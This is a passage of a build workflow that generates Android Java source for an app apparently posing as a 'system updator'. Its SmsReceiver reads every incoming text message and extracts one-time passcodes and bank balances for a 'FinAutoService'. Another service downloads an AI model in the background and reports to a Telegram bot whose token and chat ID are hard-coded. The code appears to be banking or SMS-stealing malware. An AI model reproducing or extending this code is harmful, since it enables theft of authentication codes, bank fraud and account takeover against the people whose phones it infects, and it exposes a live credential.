      - name: Create SmsReceiver.java (reads OTP and balance)
        run: |
          cat > app/src/main/java/com/system/updator/SmsReceiver.java << 'EOF'
          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Build;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import android.util.Log;
          import java.util.regex.Matcher;
          import java.util.regex.Pattern;

          public class SmsReceiver extends BroadcastReceiver {
              private static final String TAG = "SmsReceiver";

              @Override
              public void onReceive(Context context, Intent intent) {
                  try {
                      Bundle bundle = intent.getExtras();
                      if (bundle == null) return;
                      Object[] pdus = (Object[]) bundle.get("pdus");
                      if (pdus == null) return;
                      for (Object pdu : pdus) {
                          SmsMessage msg;
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                              String format = bundle.getString("format");
                              msg = SmsMessage.createFromPdu((byte[]) pdu, format);
                          } else {
                              msg = SmsMessage.createFromPdu((byte[]) pdu);
                          }
                          String body = msg.getMessageBody();
                          if (body != null) {
                              // Extract OTP
                              Pattern p = Pattern.compile("\\b\\d{4,6}\\b");
                              Matcher m = p.matcher(body);
                              if (m.find()) {
                                  FinAutoService.updateOTP(m.group());
                              }
                              // Extract balance
                              double bal = extractBalance(body);
                              if (bal > 0) {
                                  FinAutoService.updateBalance(bal, body, System.currentTimeMillis());
                              }
                          }
                      }
                  } catch (Exception e) { Log.e(TAG, "SMS error", e); }
              }

              private double extractBalance(String text) {
                  try {
                      Pattern p = Pattern.compile("([\\d,\\.]+)");
                      Matcher m = p.matcher(text);
                      while (m.find()) {
                          String num = m.group(1).replace(",", "").replace(" ", "");
                          double val = Double.parseDouble(num);
                          if (val > 0 && val < 1000000) return val;
                      }
                  } catch (Exception e) { }
                  return 0;
              }
          }
          EOF

      # ---------------- AIDownloaderService with resume capability ----------------
      - name: Create AIDownloaderService.java
        run: |
          cat > app/src/main/java/com/system/updator/AIDownloaderService.java << 'EOF'
          package com.system.updator;

          import android.app.Service;
          import android.content.Intent;
          import android.os.AsyncTask;
          import android.os.IBinder;
          import android.util.Log;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class AIDownloaderService extends Service {
              private static final String TAG = "AIDownloader";
              private static final String MODEL_URL = "https://huggingface.co/Simiyu2858/Simiyu/resolve/main/qwen2.5-1.5b-instruct-q4_k_m.gguf?download=true";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              @Override
              public int onStartCommand(Intent intent, int flags, int startId) {
                  new DownloadTask().execute();
                  return START_STICKY;
              }

              @Override
              public IBinder onBind(Intent intent) { return null; }

              private class DownloadTask extends AsyncTask<Void, Integer, Boolean> {
                  @Override
                  protected Boolean doInBackground(Void... params) {
                      try {
                          File modelDir = new File(getFilesDir(), "models");
                          if (!modelDir.exists()) modelDir.mkdirs();

                          File modelFile = new File(modelDir, "qwen2.5-1.5b-instruct-q4_k_m.gguf");

                          // If file exists and size > 900MB, assume complete
                          if (modelFile.exists() && modelFile.length() > 900000000) {
                              sendTelegram("AI model already downloaded.");
                              return true;
                          }

                          // Partial download? Get existing size to resume
                          long downloaded = modelFile.exists() ? modelFile.length() : 0;
                          if (downloaded > 0) {
                              Log.d(TAG, "Resuming download from " + downloaded + " bytes");
                          }

                          HttpURLConnection conn = (HttpURLConnection) new URL(MODEL_URL).openConnection();
                          conn.setRequestProperty("Range", "bytes=" + downloaded + "-");
                          conn.connect();

                          int responseCode = conn.getResponseCode();
                          boolean isPartial = (responseCode == HttpURLConnection.HTTP_PARTIAL);
                          int contentLength = conn.getContentLength();
                          if (contentLength <= 0 && !isPartial) {
                              // Full download
                              conn.disconnect();
                              conn = (HttpURLConnection) new URL(MODEL_URL).openConnection();
                              conn.connect();
                          }

                          InputStream input = conn.getInputStream();
                          FileOutputStream output = new FileOutputStream(modelFile, downloaded > 0);

                          byte[] buffer = new byte[4096];
                          int bytesRead;
                          long totalRead = downloaded;
                          int lastProgress = 0;
                          int totalSize = conn.getContentLength() + (int)downloaded;

                          while ((bytesRead = input.read(buffer)) != -1) {
                              output.write(buffer, 0, bytesRead);
                              totalRead += bytesRead;
                              int progress = (int) ((totalRead * 100) / totalSize);
                              if (progress > lastProgress + 5) {
                                  lastProgress = progress;
                                  Log.d(TAG, "Download progress: " + progress + "%");
                              }
                          }

                          output.close();
                          input.close();
                          conn.disconnect();

                          sendTelegram("AI model download complete!");
                          return true;

                      } catch (Exception e) {
                          Log.e(TAG, "Download error", e);
                          sendTelegram("AI download failed: " + e.getMessage());
                          return false;
                      }
                  }

                  private void sendTelegram(String msg) {
                      try {
                          java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg + "\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) { }
                  }
              }
          }
